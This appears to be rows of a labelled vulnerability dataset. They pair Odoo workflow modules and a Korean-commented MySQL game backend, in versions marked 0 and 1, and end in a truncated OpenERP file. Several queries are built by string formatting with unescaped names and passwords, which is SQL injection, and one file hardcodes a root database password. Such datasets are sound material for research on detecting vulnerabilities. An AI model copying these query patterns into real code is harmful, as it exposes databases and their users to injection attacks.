                raise exceptions.ValidationError(
                    _(""Transition can't have async action and postcontitions"")
                )

    name = fields.Char(
        help=""Transition's name"", required=True, translate=True, size=32
    )

    description = fields.Text(required=False, translate=True, size=256)

    automaton = fields.Many2one(
        comodel_name=""crapo.automaton"",
        related=""from_state.automaton"",
        store=True,
        required=True,
        index=True,
    )

    model_id = fields.Many2one(
        string=""Model"", comodel_name=""ir.model"", related=""automaton.model_id""
    )

    from_state = fields.Many2one(
        comodel_name=""crapo.state"",
        ondelete=""cascade"",
        required=True,
        index=True,
    )

    to_state = fields.Many2one(
        comodel_name=""crapo.state"",
        ondelete=""cascade"",
        required=True,
        index=True,
    )

    preconditions = fields.Char(
        string=""Pre-conditions"",
        help=""""""Conditions to be checked before
 initiating this transition.

Evaluation environment contains 'object' which is a reference to the object
to be checked, and 'env' which is a reference to odoo environment"""""",
        required=False,
    )

    postconditions = fields.Char(
        string=""Post-conditions"",
        help=""""""
                    Conditions to be checked before ending this transition.
                    Evaluation environment contains 'object' which is a
                    reference to the object to be checked, and 'env' which
                    is a reference to odoo environment
                    """""",
        required=False,
    )

    action = fields.Many2one(
        string=""Action to be executed"",
        comodel_name=""crapo.action"",
        required=False,
    )

    async_action = fields.Boolean(
        help=""""""Action will be run asynchronously, after transition
                                  is completed"""""",
        default=False,
    )

    write_before = fields.Boolean(
        string=""Write Object before"",
        help=""""""
All updates to object will be commited before transitioning

This is useful for transitions where preconditions needs to be
tested with values that might have either changed together with the state
change or during the write process (computed fields) """""",
        default=False,
    )

    @api.model
    def create(self, values):
        """"""
           Override to prevent save postcondtions on async_action
        """"""
        if values.get(""async_action""):
            values[""postconditions""] = False
        return super(StateMachineTransition, self).create(values)

    @api.multi
    def write(self, values):
        """"""
            Override to prevent save postcondtions on async_action
        """"""
        if values.get(""async_action""):
            values[""postconditions""] = False

        return super(StateMachineTransition, self).write(values)
/n/n/nbase_crapo_workflow/models/business_object.py/n/n# ©2018-2019 Article 714
# License AGPL-3.0 or later (http://www.gnu.org/licenses/agpl.html).

from odoo import models

from .mixins import crapo_automata_mixins


class CrapoBusinessObject(
    crapo_automata_mixins.ObjectWithStateMixin, models.Model
):
    """"""
    Base class to define a Business Object.

    Should be use as a mixin class in existing objects
    """"""

    _name = ""crapo.business.object""
    _inherit = [""mail.thread"", ""mail.activity.mixin""]
    _description = """"""
    An object on which to  in a workflow, specific to a given model
    """"""
    _sync_state_field = """"
/n/n/nbase_crapo_workflow/models/state.py/n/n# ©2018 Article 714
# License AGPL-3.0 or later (http://www.gnu.org/licenses/agpl.html).

from odoo import fields, models, _, api, exceptions

from .mixins import (
    crapo_automata_mixins,
)  # pylint: disable=odoo-addons-relative-import


class State(crapo_automata_mixins.StateObjectMixin, models.Model):
    """"""
    A state used in the context of an automaton
    """"""

    _name = ""crapo.state""
    _description = u""State in a workflow, specific to a given model""
    _order = ""sequence, name""

    name = fields.Char(
        help=""State's name"", required=True, translate=True, size=32
    )

    description = fields.Char(required=False, translate=True, size=256)

    sequence = fields.Integer(
        default=1,
        help=""Sequence gives the order in which states are displayed"",
    )

    fold = fields.Boolean(
        string=""Folded in kanban"",
        help=(
            ""This stage is folded in the kanban view ""
            ""when there are no records in that stage to display.""
        ),
        default=False,
    )

    @api.multi
    def write(self, values):
        """"""
        Override default method to check if there is a valid default_state
        """"""
        if ""default_state"" in values:
            if values[""default_state""]:
                if len(self) > 1:
                    raise exceptions.ValidationError(
                        _(u""There should only one default state per model"")
                    )
                else:
                    found = self.search(
                        [
                            (""default_state"", ""="", True),
                            (""automaton"", ""="", self.automaton.id),
                            (""id"", ""!="", self.id),
                        ]
                    )
                    for s in found:
                        s.write({""default_state"": False})

        return super(State, self).write(values)
/n/n/ncrapo_tests/models/crm_stage.py/n/n""""""
©2019
License: AGPL-3

@author: C. Guychard (Article 714)

""""""


from odoo import models, api
from odoo.addons.base_crapo_workflow.mixins import (
    crapo_automata_mixins,
)  # pylint: disable=odoo-addons-relative-import


class CrmStageWithMixin(crapo_automata_mixins.WrappedStateMixin, models.Model):
    _inherit = ""crm.stage""
    _state_for_model = ""crm.lead""

    def write(self, values):
        if len(self) == 1:
            if ""crapo_state"" not in values and not self.crapo_state:
                if ""name"" in values:
                    vals = {""name"": values[""name""]}
                else:
                    vals = {""name"": self.name}
                mystate = self._compute_related_state(vals)
                values[""crapo_state""] = mystate.id

        return super(CrmStageWithMixin, self).write(values)

    @api.model
    def create(self, values):
        if ""crapo_state"" not in values and not self.crapo_state:
            if ""name"" in values:
                vals = {""name"": values[""name""]}
            mystate = self._compute_related_state(vals)
            values[""crapo_state""] = mystate.id

        return super(CrmStageWithMixin, self).create(values)

    @api.model_cr_context
    def _init_column(self, column_name):
        """""" Initialize the value of the given column for existing rows.
            Overridden here because we need to wrap existing stages in
            a new crapo_state for each stage (including a default automaton)
        """"""
        if column_name not in [""crapo_state""]:
            super(CrmStageWithMixin, self)._init_column(column_name)
        else:
            default_compute = self._compute_related_state

            self.env.cr.execute(
                'SELECT id, name FROM ""%s"" WHERE ""%s"" is NULL',
                (self._table, column_name),
            )
            stages = self.env.cr.fetchall()

            for stage in stages:
                default_value = default_compute(values={""name"": stage[1]})

                self.env.cr.execute(
                    'UPDATE ""%s"" SET ""%s""=%s WHERE id = %s',
                    (self._table, column_name, default_value.id, stage[0]),
                )
/n/n/n",0
163,163,521850b74dd7c2a7e21bfde6d362db605c478a91,"/base_crapo_workflow/mixins/crapo_automata_mixins.py/n/n# coding: utf-8

# ©2018-2019 Article 714
# License AGPL-3.0 or later (http://www.gnu.org/licenses/agpl.html).
import logging

from odoo import fields, api, exceptions, _
from odoo import SUPERUSER_ID
from odoo.tools.safe_eval import safe_eval

from odoo.addons.base_crapo_workflow.mixins.crapo_readonly_view_mixin import (
    ReadonlyViewMixin,
)


class ObjectWithStateMixin(ReadonlyViewMixin):
    """"""
        Mixin class that can be used to define an Odoo Model eligible
        to be managed by a Crapo Automaton

        Should be use as a mixin class in existing objects
    """"""

    _readonly_domain = (
        ""[('crapo_readonly_fields', 'like', ',{},'.format(field_name))]""
    )
    _readonly_fields_to_add = [""crapo_readonly_fields""]

    automaton = fields.Many2one(
        comodel_name=""crapo.automaton"",
        string=""Related automaton"",
        help=(
            ""The automaton describes the various transitions ""
            ""an object can go through between states.""
        ),
        default=lambda self: self._get_model_automaton(),
        store=True,
        index=True,
        required=True,
    )

    state = fields.Many2one(
        comodel_name=""crapo.state"",
        help=""""""State in which this object is"""""",
        track_visibility=""onchange"",
        domain=lambda self: self._get_state_domain(),
        group_expand=""_read_group_states"",
        default=lambda self: self._get_default_state(),
        store=True,
        index=True,
        required=True,
    )

    crapo_readonly_fields = fields.Char(
        compute=""_compute_crapo_readonly_fields"", default="",0,""
    )

    @api.depends(""state"")
    @api.onchange(""state"")
    def _compute_crapo_readonly_fields(self):
        for rec in self:
            if rec.state.readonly_fields:
                rec.crapo_readonly_fields = "",{},"".format(
                    rec.state.readonly_fields
                )
            else:
                rec.crapo_readonly_fields = "",0,""

    # Computes automaton for current model
    @api.model
    def _get_model_automaton(self):
        automaton_model = self.env[""crapo.automaton""]

        my_model = self.env[""ir.model""].search(
            [(""model"", ""="", self._name)], limit=1
        )
        my_automaton = automaton_model.search(
            [(""model_id"", ""="", my_model.id)], limit=1
        )

        if my_automaton:
            return my_automaton
        else:
            return automaton_model.create(
                {
                    ""name"": ""Automaton for {}"".format(self._name),
                    ""model_id"": my_model.id,
                }
            )

    # State Management
    def _get_state_domain(self, domain=None):
        result = []

        if self.automaton:
            result.append((""automaton"", ""="", self.automaton.id))
        else:
            result.append((""automaton"", ""="", self._get_model_automaton().id))

        return result

    def _get_default_state(self):
        domain = self._get_state_domain()
        state_model = self.env[""crapo.state""]
        automaton = self._get_model_automaton()

        if automaton:
            domain.append(""|"")
            domain.append((""is_start_state"", ""="", True))
            domain.append((""default_state"", ""="", 1))

        default_state = state_model.search(domain, limit=1)

        if default_state:
            return default_state
        elif automaton:
            return state_model.create(
                {""name"": ""New"", ""automaton"": automaton.id}
            )
        else:
            return False

    def _next_states(self):
        self.ensure_one()
        domain = self._get_state_domain()

        next_states = False
        if self.automaton:
            eligible_transitions = self.env[""crapo.transition""].search(
                [
                    (""automaton"", ""="", self.automaton.id),
                    (""from_state"", ""="", self.state.id),
                ]
            )

            target_ids = eligible_transitions.mapped(lambda x: x.to_state.id)

            if target_ids:
                domain.append((""id"", ""in"", target_ids))

                next_states = self.env[""crapo.state""].search(domain)

        else:
            domain.append((""sequence"", "">"", self.state.sequence))
            next_states = self.env[""crapo.state""].search(domain, limit=1)

        return next_states

    def _read_group_states(self, states, domain, order):
        search_domain = self._get_state_domain(domain=domain)
        state_ids = states._search(
            search_domain, order=order, access_rights_uid=SUPERUSER_ID
        )
        return states.browse(state_ids)

    # =================
    # Write / Create
    # =================
    @api.multi
    def write(self, values):
        """"""
            Override write method in order to preventing transitioning
            to a non eligible state
        """"""
        # Look for a change of state
        target_state_id = None
        result = True

        if ""state"" in values:
            target_state_id = values[""state""]

        # check if there is a change state needed
        if target_state_id is not None:
            # Search for elected transition
            transition = self._get_transition(target_state_id)

            if transition:
                result = True

                if transition.write_before:
                    result = super(ObjectWithStateMixin, self).write(values)

                self.exec_conditions(transition.preconditions, ""Pre"")
                self.exec_action(transition.action, transition.async_action)
                self.exec_conditions(transition.postconditions, ""Post"")

                # Return now if write has already been done
                if transition.write_before:
                    return result

        return super(ObjectWithStateMixin, self).write(values)

    def _get_transition(self, target_state_id):
        """"""
            Retrieve transition between two state
        """"""
        # Check if next state is valid
        current_state = False
        for rec in self:
            next_states = rec._next_states()
            if rec.state.id == target_state_id:
                current_state = rec.state
                continue
            elif not next_states:
                raise exceptions.ValidationError(
                    _(""No target state is elegible for transitionning"")
                )
            elif target_state_id not in next_states.ids:
                raise exceptions.ValidationError(
                    _(""State is not in eligible target states"")
                )
            elif current_state is not False and current_state != rec.state:
                raise exceptions.ValidationError(
                    _(""Transitionning is not possible from differents states"")
                )
            else:
                current_state = rec.state

        # Search for elected transition
        transition = self.env[""crapo.transition""].search(
            [
                (""from_state"", ""="", current_state.id),
                (""to_state"", ""="", target_state_id),
            ],
            limit=1,
        )

        return transition

    def exec_conditions(self, conditions, prefix):
        """"""
            Execute Pre/Postconditions.

            conditions: must be a safe_eval expression
            prefix: a string to indicate if it's pre or post conditions
        """"""
        if conditions:
            for rec in self:
                try:
                    is_valid = safe_eval(
                        conditions, {""object"": rec, ""env"": self.env}
                    )
                except Exception as err:
                    logging.error(
                        ""CRAPO: Failed to validate transition %sconditions: %s"",
                        prefix,
                        str(err),
                    )
                    is_valid = False

                # Raise an error if not valid
                if not is_valid:
                    raise exceptions.ValidationError(
                        _(""Invalid {}-conditions for Object: {}"").format(
                            prefix, rec.display_name
                        )
                    )

    def exec_action(self, action, async_action):
        if action:
            context = {
                ""active_model"": self._name,
                ""active_id"": self.id,
                ""active_ids"": self.ids,
            }
            if async_action:
                action.with_delay().run_async(context)
            else:
                action.with_context(context).run()


class StateObjectMixin(object):
    """"""
    Mixin class that can be used to define a state object
    that can be used as a crapo_state

    Should be use as a mixin class in existing objects
    """"""

    automaton = fields.Many2one(
        comodel_name=""crapo.automaton"",
        default=lambda self: self._get_default_automaton(),
        store=True,
        required=True,
        index=True,
    )

    default_state = fields.Boolean(
        help=""Might be use as default stage."", default=False, store=True
    )

    # Transitions (inverse relations)

    transitions_to = fields.One2many(
        string=""Incomint transitions"",
        comodel_name=""crapo.transition"",
        inverse_name=""to_state"",
    )

    transitions_from = fields.One2many(
        string=""Outgoing transitions"",
        comodel_name=""crapo.transition"",
        inverse_name=""from_state"",
    )
    # computed field to identify start and end states

    is_start_state = fields.Boolean(
        ""Start State"",
        compute=""_compute_is_start_state"",
        store=True,
        index=True,
    )

    is_end_state = fields.Boolean(
        ""End State"", compute=""_compute_is_end_state"", store=True, index=True
    )

    readonly_fields = fields.Char(
        help=""List of model's fields name separated by comma""
    )

    @api.depends(""transitions_to"", ""automaton"")
    def _compute_is_start_state(self):
        for record in self:
            if (
                len(record.transitions_to) == 0
                or record.transitions_to is False
            ):
                record.is_start_state = True
            else:
                record.is_start_state = False

    @api.depends(""transitions_from"", ""automaton"")
    def _compute_is_end_state(self):
        for record in self:
            if (
                len(record.transitions_to) == 0
                or record.transitions_to is False
            ):
                record.is_end_state = True
            else:
                record.is_end_state = False

    def _do_search_default_automaton(self):
        return False

    @api.model
    def _get_default_automaton(self):
        default_value = 0
        if ""current_automaton"" in self.env.context:
            try:
                default_value = int(self.env.context.get(""current_automaton""))
            except Exception:
                default_value = 0
        else:
            return self._do_search_default_automaton()

        return self.env[""crapo.automaton""].browse(default_value)


class WrappedStateMixin(StateObjectMixin):
    """"""
    Mixin class that can be used to define a state object that
    wraps an existing model defining a state for another model

    The wrapped object can be used as a crapo_state

    Should be use as a mixin class in existing objects
    """"""

    _inherits = {""crapo.state"": ""crapo_state""}

    crapo_state = fields.Many2one(
        comodel_name=""crapo.state"",
        string=""Related Crapo State"",
        store=True,
        index=True,
        required=True,
        ondelete=""cascade"",
    )

    def _do_search_default_automaton(self):
        """"""
        finds or creates the default automaton (one per model)
        """"""
        automaton_model = self.env[""crapo.automaton""]
        my_model = self.env[""ir.model""].search(
            [(""model"", ""="", self._state_for_model)], limit=1
        )
        my_automaton = automaton_model.search([(""model_id"", ""="", my_model.id)])
        if not my_automaton:
            my_automaton = automaton_model.create(
                {
                    ""name"": ""Automaton for {}"".format(self._state_for_model),
                    ""model_id"": my_model.id,
                }
            )
        return my_automaton

    def _compute_related_state(
        self, values={}
    ):  # pylint: disable=dangerous-default-value
        """"""
        Create a new crapo_state for an existing record of the WrappedState
        """"""
        my_automaton = self._do_search_default_automaton()

        if not self.crapo_state:
            if not my_automaton:
                return False
            else:
                if ""name"" not in values:
                    values[""name""] = ""Default State for %s"" % self.id
                values[""automaton""] = my_automaton.id
                return self.env[""crapo.state""].create(values)
/n/n/n/base_crapo_workflow/mixins/crapo_readonly_view_mixin.py/n/n# coding: utf-8

# ©2018-2019 Article 714
# License AGPL-3.0 or later (http://www.gnu.org/licenses/agpl.html).
import logging

from lxml import etree
from lxml.builder import E

from odoo.tools.safe_eval import safe_eval
from odoo.osv import expression


class ReadonlyViewMixin(object):
    """"""
        Mixin class that can be used to set a whole view readonly with domains
    """"""

    _readonly_domain = []
    _readonly_fields_to_add = []

    def _fields_view_get(
        self, view_id=None, view_type=""form"", toolbar=False, submenu=False
    ):
        """"""
            Override to add crapo_readonly_fields to arch and attrs readonly
            on fields that could be editable
        """"""
        result = super(ReadonlyViewMixin, self)._fields_view_get(
            view_id, view_type, toolbar, submenu
        )

        readonly_fields = self.fields_get(attributes=[""readonly""])
        node = etree.fromstring(result[""arch""])
        for field in self._readonly_fields_to_add:
            node.append(E.field(name=field, invisible=""1""))

        if not isinstance(self._readonly_domain, (list, tuple)):
            lst_domain = [self._readonly_domain]
        else:
            lst_domain = self._readonly_domain

        self._process_field(node, readonly_fields, lst_domain)
        result[""arch""] = etree.tostring(node)
        return result

    def _process_field(self, node, readonly_fields, lst_domain):
        """"""
            Add readnoly attrs if needed
        """"""
        if node.get(""readonly_global_domain""):
            lst_domain = lst_domain + [node.get(""readonly_global_domain"")]

        if node.tag == ""field"":
            field_name = node.get(""name"")

            attrs = safe_eval(node.get(""attrs"", ""{}""))
            readonly = attrs.get(""readonly"") or node.get(""readonly"")
            if isinstance(readonly, str):
                readonly = safe_eval(node.get(""readonly"", ""{}""))

            # Deal with none domain value, if field is explicitly in readonly we skip
            if not isinstance(readonly, (list, tuple)) and readonly:
                return
            # If there is no domain define and fields is already in readonly
            # we skip too
            elif readonly is None and readonly_fields[field_name][""readonly""]:
                return

            _readonly_domain = expression.OR(
                [safe_eval(domain, {""field_name"": field_name}) for domain in lst_domain]
            )
            if readonly:
                _readonly_domain = expression.OR([readonly, _readonly_domain])

            attrs[""readonly""] = _readonly_domain
            node.set(""attrs"", str(attrs))

        else:
            for child_node in node:
                self._process_field(child_node, readonly_fields, lst_domain)
/n/n/n/base_crapo_workflow/models/business_object.py/n/n# coding: utf-8

# ©2018-2019 Article 714
# License AGPL-3.0 or later (http://www.gnu.org/licenses/agpl.html).

from odoo import models

from odoo.addons.base_crapo_workflow.mixins import (
    crapo_automata_mixins,
)  # pylint: disable=odoo-addons-relative-import


class CrapoBusinessObject(crapo_automata_mixins.ObjectWithStateMixin, models.Model):
    """"""
    Base class to define a Business Object.

    Should be use as a mixin class in existing objects
    """"""

    _name = ""crapo.business.object""
    _inherit = [""mail.thread"", ""mail.activity.mixin""]
    _description = """"""
    An object on which to  in a workflow, specific to a given model
    """"""
    _sync_state_field = """"
/n/n/n/base_crapo_workflow/models/state.py/n/n# coding: utf-8

# ©2018 Article 714
# License AGPL-3.0 or later (http://www.gnu.org/licenses/agpl.html).

from odoo import fields, models, _, api, exceptions

from odoo.addons.base_crapo_workflow.mixins import (
    crapo_automata_mixins,
)  # pylint: disable=odoo-addons-relative-import


class State(crapo_automata_mixins.StateObjectMixin, models.Model):
    """"""
    A state used in the context of an automaton
    """"""

    _name = ""crapo.state""
    _description = u""State in a workflow, specific to a given model""
    _order = ""sequence, name""

    name = fields.Char(help=""State's name"", required=True, translate=True, size=32)

    description = fields.Char(required=False, translate=True, size=256)

    sequence = fields.Integer(
        default=1, help=""Sequence gives the order in which states are displayed""
    )

    fold = fields.Boolean(
        string=""Folded in kanban"",
        help=(
            ""This stage is folded in the kanban view ""
            ""when there are no records in that stage to display.""
        ),
        default=False,
    )

    @api.multi
    def write(self, values):
        """"""
        Override default method to check if there is a valid default_state
        """"""
        if ""default_state"" in values:
            if values[""default_state""]:
                if len(self) > 1:
                    raise exceptions.ValidationError(
                        _(u""There should only one default state per model"")
                    )
                else:
                    found = self.search(
                        [
                            (""default_state"", ""="", True),
                            (""automaton"", ""="", self.automaton.id),
                            (""id"", ""!="", self.id),
                        ]
                    )
                    for s in found:
                        s.write({""default_state"": False})

        return super(State, self).write(values)
/n/n/n/crapo_tests/models/crm_stage.py/n/n""""""
©2019
License: AGPL-3

@author: C. Guychard (Article 714)

""""""


from odoo import models, api
from odoo.addons.base_crapo_workflow.mixins import (
    crapo_automata_mixins,
)  # pylint: disable=odoo-addons-relative-import


class CrmStageWithMixin(crapo_automata_mixins.WrappedStateMixin, models.Model):
    _inherit = ""crm.stage""
    _state_for_model = ""crm.lead""

    def write(self, values):
        if len(self) == 1:
            if ""crapo_state"" not in values and not self.crapo_state:
                if ""name"" in values:
                    vals = {""name"": values[""name""]}
                else:
                    vals = {""name"": self.name}
                mystate = self._compute_related_state(vals)
                values[""crapo_state""] = mystate.id

        return super(CrmStageWithMixin, self).write(values)

    @api.model
    def create(self, values):
        if ""crapo_state"" not in values and not self.crapo_state:
            if ""name"" in values:
                vals = {""name"": values[""name""]}
            mystate = self._compute_related_state(vals)
            values[""crapo_state""] = mystate.id

        return super(CrmStageWithMixin, self).create(values)

    @api.model_cr_context
    def _init_column(self, column_name):
        """""" Initialize the value of the given column for existing rows.
            Overridden here because we need to wrap existing stages in
            a new crapo_state for each stage (including a default automaton)
        """"""
        if column_name not in [""crapo_state""]:
            super(CrmStageWithMixin, self)._init_column(column_name)
        else:
            default_compute = self._compute_related_state

            query = 'SELECT id, name FROM ""%s"" WHERE ""%s"" is NULL' % (
                self._table,
                column_name,
            )
            self.env.cr.execute(query)
            stages = self.env.cr.fetchall()

            for stage in stages:
                default_value = default_compute(values={""name"": stage[1]})

                query = 'UPDATE ""%s"" SET ""%s""=%%s WHERE id = %s' % (
                    self._table,
                    column_name,
                    stage[0],
                )
                self.env.cr.execute(query, (default_value.id,))
/n/n/n",1
68,68,47f5aa6aa2e82de7ce2a440aea870958edf0ae77,"db/db_processor_mysql.py/n/n#db_processor_mysql.py
import asyncio
import tormysql
import pymysql

_pool = None
_handler = None

def set_log_handler(handler):
    '''db관련 에러메시지를 처리할 핸들러를 등록한다.'''
    global _handler
    _handler = handler

def connect_db_server(host_addr, user_id, password, db, loop):
    '''db pool을 연다.'''
    global _pool
    _pool = tormysql.ConnectionPool(
        max_connections = 20,
        idle_seconds = 7200,
        wait_connection_timeout = 3,
        host = host_addr,
        user = user_id,
        passwd = password,
        db = db,
        charset = ""utf8"")

    return loop.run_until_complete(is_connect_db())

async def is_connect_db():
    try:
        async with await _pool.Connection():
            pass
    except Exception as ex:
        _error_report(ex)
        return False

    return True

async def create_account(name: str, password: str):
    '''db에 계정을 생성한다.'''
    global _pool
    uid = -1
    prevented_name = pymysql.escape_string(name)
    query = ""INSERT INTO player (name, password, lv, xp, hp) values ('%s', '%s', 1, 0, 150)"" % (prevented_name, password)
    async with await _pool.Connection() as conn:
        try:
            async with conn.cursor() as cursor:
                await cursor.execute(query)
                uid = conn.insert_id()
        except Exception as ex:
            await conn.rollback()
            _error_report(ex)
            return False, -1  
        await conn.commit()

    return True, uid

async def get_player_info(name: str) -> tuple:
    '''db에서 플레이어 정보를 얻어온다.'''
    global _pool
    prevented_name = pymysql.escape_string(name)
    query = ""SELECT uid, name, password, lv, xp, hp FROM player where name = '%s'"" % prevented_name
    async with await _pool.Connection() as conn:
        try:
            async with conn.cursor() as cursor:
                await cursor.execute(query)
                data = cursor.fetchone()
        except Exception as ex:
            _error_report(ex)
            return tuple()

    if data is None:
        return tuple()

    return data

async def update_level_and_xp(name: str, lv: int, xp: int):
    '''level, xp 정보를 업데이트 한다.'''
    global _pool
    async with await _pool.Connection() as conn:
        try:
            async with conn.cursor() as cursor:
                await cursor.execute(""UPDATE player SET lv=%d, xp=%d where name = '%s'"" % (lv, xp, name))
        except Exception as ex:
            _error_report(ex)
            return False
        await conn.commit() 

    return True

async def update_hp(name: str, hp: int):
    '''hp 정보를 업데이트 한다.'''
    global _pool
    async with await _pool.Connection() as conn:
        try:
            async with conn.cursor() as cursor:
                await cursor.execute(""UPDATE player SET hp=%d where name = '%s'"" % (hp, name))
        except Exception as ex:
            _error_report(ex)
            return False
        await conn.commit() 

    return True

async def create_item(player_uid:int, item_id: int):
    '''db에 아이템을 추가한다.'''
    global _pool
    uid = -1
    async with await _pool.Connection() as conn:
        try:
            async with conn.cursor() as cursor:
                await cursor.execute(""INSERT INTO item (player_uid, item_id)\
                 values (%d, %d)"" % (player_uid, item_id))
            uid = conn.insert_id()
        except Exception as ex:
            _error_report(ex)
            return False, -1
        await conn.commit()

    return True, uid

async def get_item_list(player_uid: int):
    '''db에서 특정 플레이어의 소유 아이템 리스트를 얻어온다.'''
    global _pool
    async with await _pool.Connection() as conn:
        try:
            async with conn.cursor() as cursor:
                await cursor.execute(""SELECT uid, item_id FROM item where player_uid = %d"" % player_uid)
                datas = cursor.fetchall()
        except Exception as ex:
            _error_report(ex)
            return tuple(), False

    return datas, True

def close():
    '''db pool을 종료한다.'''
    global _pool
    if _pool is not None:
        _pool.close()
        _pool = None

def _error_report(err_msg):
    '''에러 핸들러로 에러메시지를 던진다.'''
    global _handler
    if _handler:
        _handler(err_msg)

if __name__ == '__main__':
    def error_handler(msg):
        print(msg)

    loop = asyncio.get_event_loop()
    set_log_handler(error_handler)
    result = connect_db_server('127.0.0.1', 'root', 'Mysql12345', 'mud_db', loop)
    print('db connect result is ' + str(result))
    close()


/n/n/n",0
69,69,47f5aa6aa2e82de7ce2a440aea870958edf0ae77,"/db/db_processor_mysql.py/n/n#db_processor_mysql.py
import asyncio
import tormysql

_pool = None
_handler = None

def set_log_handler(handler):
    '''db관련 에러메시지를 처리할 핸들러를 등록한다.'''
    global _handler
    _handler = handler

def connect_db_server(host_addr, user_id, password, db, loop):
    '''db pool을 연다.'''
    global _pool
    _pool = tormysql.ConnectionPool(
        max_connections = 20,
        idle_seconds = 7200,
        wait_connection_timeout = 3,
        host = host_addr,
        user = user_id,
        passwd = password,
        db = db,
        charset = ""utf8"")

    return loop.run_until_complete(is_connect_db())

async def is_connect_db():
    try:
        async with await _pool.Connection():
            pass
    except Exception as ex:
        _error_report(ex)
        return False

    return True

async def create_account(name: str, password: str):
    '''db에 계정을 생성한다.'''
    global _pool
    uid = -1
    async with await _pool.Connection() as conn:
        try:
            async with conn.cursor() as cursor:
                await cursor.execute(\
                    ""INSERT INTO player (name, password, lv, xp, hp) values ('%s', '%s', 1, 0, 150)""\
                    % (name, password))
                uid = conn.insert_id()
        except Exception as ex:
            await conn.rollback()
            _error_report(ex)
            return False, -1  
        await conn.commit()

    return True, uid

async def get_player_info(name: str) -> tuple:
    '''db에서 플레이어 정보를 얻어온다.'''
    global _pool
    async with await _pool.Connection() as conn:
        try:
            async with conn.cursor() as cursor:
                await cursor.execute(""SELECT uid, name, password, lv, xp, hp FROM player where name = '%s'"" % name)
                data = cursor.fetchone()
        except Exception as ex:
            _error_report(ex)
            return tuple()

    if data is None:
        return tuple()

    return data

async def update_level_and_xp(name: str, lv: int, xp: int):
    '''level, xp 정보를 업데이트 한다.'''
    global _pool
    async with await _pool.Connection() as conn:
        try:
            async with conn.cursor() as cursor:
                await cursor.execute(""UPDATE player SET lv=%d, xp=%d where name = '%s'"" % (lv, xp, name))
        except Exception as ex:
            _error_report(ex)
            return False
        await conn.commit() 

    return True

async def update_hp(name: str, hp: int):
    '''hp 정보를 업데이트 한다.'''
    global _pool
    async with await _pool.Connection() as conn:
        try:
            async with conn.cursor() as cursor:
                await cursor.execute(""UPDATE player SET hp=%d where name = '%s'"" % (hp, name))
        except Exception as ex:
            _error_report(ex)
            return False
        await conn.commit() 

    return True

async def create_item(player_uid:int, item_id: int):
    '''db에 아이템을 추가한다.'''
    global _pool
    uid = -1
    async with await _pool.Connection() as conn:
        try:
            async with conn.cursor() as cursor:
                await cursor.execute(""INSERT INTO item (player_uid, item_id)\
                 values (%d, %d)"" % (player_uid, item_id))
            uid = conn.insert_id()
        except Exception as ex:
            _error_report(ex)
            return False, -1
        await conn.commit()

    return True, uid

async def get_item_list(player_uid: int):
    '''db에서 특정 플레이어의 소유 아이템 리스트를 얻어온다.'''
    global _pool
    async with await _pool.Connection() as conn:
        try:
            async with conn.cursor() as cursor:
                await cursor.execute(""SELECT uid, item_id FROM item where player_uid = %d"" % player_uid)
                datas = cursor.fetchall()
        except Exception as ex:
            _error_report(ex)
            return tuple(), False

    return datas, True

def close():
    '''db pool을 종료한다.'''
    global _pool
    if _pool is not None:
        _pool.close()
        _pool = None

def _error_report(err_msg):
    '''에러 핸들러로 에러메시지를 던진다.'''
    global _handler
    if _handler:
        _handler(err_msg)

if __name__ == '__main__':
    def error_handler(msg):
        print(msg)

    loop = asyncio.get_event_loop()
    set_log_handler(error_handler)
    result = connect_db_server('127.0.0.1', 'root', 'Mysql12345', 'mud_db', loop)
    print('db connect result is ' + str(result))
    loop.run_until_complete(create_item(37, 0))
    close()


/n/n/n",1
44,44,1521b235409982842b63b423c6ff7ac4ed4ca1db,"addons/stock/product.py/n/n# -*- coding: utf-8 -*-
##############################################################################
#
#    OpenERP, Open Source Management Solution
#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
##############################################################################

from osv import fields, osv
from tools.translate import _

class product_product(osv.osv):
    _inherit = ""product.product""

    def get_product_accounts(self, cr, uid, product_id, context=None):
        """""" To get the stock input account, stock output account and stock journal related to product.
        @param product_id: product id
        @return: dictionary which contains information regarding stock input account, stock output account and stock journal
        """"""
        if context is None:
            context = {}
        product_obj = self.pool.get('product.product').browse(cr, uid, product_id, context=context)

        stock_input_acc = product_obj.property_stock_account_input and product_obj.property_stock_account_input.id or False
        if not stock_input_acc:
            stock_input_acc = product_obj.categ_id.property_stock_account_input_categ and product_obj.categ_id.property_stock_account_input_categ.id or False

        stock_output_acc = product_obj.property_stock_account_output and product_obj.property_stock_account_output.id or False
        if not stock_output_acc:
            stock_output_acc = product_obj.categ_id.property_stock_account_output_categ and product_obj.categ_id.property_stock_account_output_categ.id or False

        journal_id = product_obj.categ_id.property_stock_journal and product_obj.categ_id.property_stock_journal.id or False
        account_variation = product_obj.categ_id.property_stock_variation and product_obj.categ_id.property_stock_variation.id or False

        return {
            'stock_account_input': stock_input_acc,
            'stock_account_output': stock_output_acc,
            'stock_journal': journal_id,
            'property_stock_variation': account_variation
        }

    def do_change_standard_price(self, cr, uid, ids, datas, context={}):
        """""" Changes the Standard Price of Product and creates an account move accordingly.
        @param datas : dict. contain default datas like new_price, stock_output_account, stock_input_account, stock_journal
        @param context: A standard dictionary
        @return:

        """"""
        location_obj = self.pool.get('stock.location')
        move_obj = self.pool.get('account.move')
        move_line_obj = self.pool.get('account.move.line')

        new_price = datas.get('new_price', 0.0)
        stock_output_acc = datas.get('stock_output_account', False)
        stock_input_acc = datas.get('stock_input_account', False)
        journal_id = datas.get('stock_journal', False)
        product_obj=self.browse(cr,uid,ids)[0]
        account_variation = product_obj.categ_id.property_stock_variation
        account_variation_id = account_variation and account_variation.id or False
        if not account_variation_id: raise osv.except_osv(_('Error!'), _('Variation Account is not specified for Product Category: %s' % (product_obj.categ_id.name)))
        move_ids = []
        loc_ids = location_obj.search(cr, uid,[('usage','=','internal')])
        for rec_id in ids:
            for location in location_obj.browse(cr, uid, loc_ids):
                c = context.copy()
                c.update({
                    'location': location.id,
                    'compute_child': False
                })

                product = self.browse(cr, uid, rec_id, context=c)
                qty = product.qty_available
